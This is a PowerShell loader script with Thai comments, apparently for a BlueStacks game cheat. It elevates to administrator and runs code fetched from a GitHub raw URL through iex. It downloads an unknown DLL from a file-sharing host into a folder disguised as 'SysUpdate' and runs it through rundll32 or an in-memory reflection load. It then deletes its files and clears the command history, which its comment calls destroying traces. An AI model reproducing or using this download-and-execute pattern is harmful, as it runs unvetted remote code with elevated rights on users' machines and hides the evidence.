# =========================================================
# 1. ขอสิทธิ์ Administrator และดึง Code จาก GitHub
# =========================================================
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $adminCmd = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (Invoke-RestMethod 'https://raw.githubusercontent.com/potae112/Cmdfreefire/main/dugduy.ps1')"
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$adminCmd`"" -Verb RunAs
    exit
}

# =========================================================
# 2. ตั้งค่าสภาพแวดล้อม
# =========================================================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = "https://files.catbox.moe/0ukxya.dll"
$workDir = "$env:LOCALAPPDATA\Temp\SysUpdate"
$downloadPath = Join-Path $workDir "temp_file"
$blueStacksPath = "C:\Program Files\BlueStacks_nxt\HD-Player.exe"

if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# =========================================================
# 3. ดาวน์โหลดไฟล์
# =========================================================
Write-Host "[*] Downloading Component..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $url -OutFile $downloadPath -UseBasicParsing -ErrorAction Stop
} catch {
    Write-Host "[!] Download failed." -ForegroundColor Red; Pause; exit
}

# =========================================================
# 4. แยกประเภทไฟล์ (ZIP หรือ DLL)
# =========================================================
$fileMagic = -join ((Get-Content $downloadPath -Encoding Byte -TotalCount 2) | ForEach-Object { "{0:X2}" -f $_ })

if ($fileMagic -eq "504B") {
    Write-Host "[+] Extracting Package..." -ForegroundColor Green
    Expand-Archive -Path $downloadPath -DestinationPath $workDir -Force
    Remove-Item $downloadPath
} else {
    Write-Host "[+] Detected Direct DLL. Renaming..." -ForegroundColor Green
    $finalDllPath = Join-Path $workDir "SystemData.dll"
    Move-Item $downloadPath $finalDllPath -Force
}

# =========================================================
# 5. การรันระบบ (แก้ปัญหา Missing Entry)
# =========================================================
$exe = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
$dll = Get-ChildItem -Path $workDir -Filter "*.dll" -Recurse | Select-Object -First 1

if ($exe) {
    Write-Host "[*] Launching EXE: $($exe.Name)" -ForegroundColor Cyan
    Start-Process -FilePath $exe.FullName -WorkingDirectory $exe.DirectoryName -Wait
} elseif ($dll) {
    Write-Host "[*] Attempting to load DLL..." -ForegroundColor Cyan
    
    # ทดลองรันด้วย Entry Point มาตรฐานหลายๆ ตัวเพื่อป้องกัน Error
    $entries = @("DllRegisterServer", "DllInstall", "main", "Control_RunDLL")
    $success = $false

    foreach ($entry in $entries) {
        Write-Host "[?] Trying Entry: $entry" -ForegroundColor Gray
        $proc = Start-Process "rundll32.exe" -ArgumentList "`"$($dll.FullName)`",$entry `"$blueStacksPath`"" -PassThru -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        
        if (!$proc.HasExited) {
            Write-Host "[+] DLL is running with entry: $entry" -ForegroundColor Green
            $success = $true
            $proc | Wait-Process
            break
        }
    }

    if (!$success) {
        Write-Host "[!] Rundll32 failed. Trying Reflection Load (Memory)..." -ForegroundColor Yellow
        try {
            [Reflection.Assembly]::LoadFile($dll.FullName) | Out-Null
            Write-Host "[+] DLL Loaded into Memory Successfully." -ForegroundColor Green
        } catch {
            Write-Host "[!] This DLL is not a .NET assembly or entry point is invalid." -ForegroundColor Red
        }
    }
}

# =========================================================
# 6. ทำลายร่องรอย
# =========================================================
Write-Host "[*] Cleaning up activity traces..." -ForegroundColor Gray
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
Clear-History
Write-Host "[+] Operation Complete." -ForegroundColor Green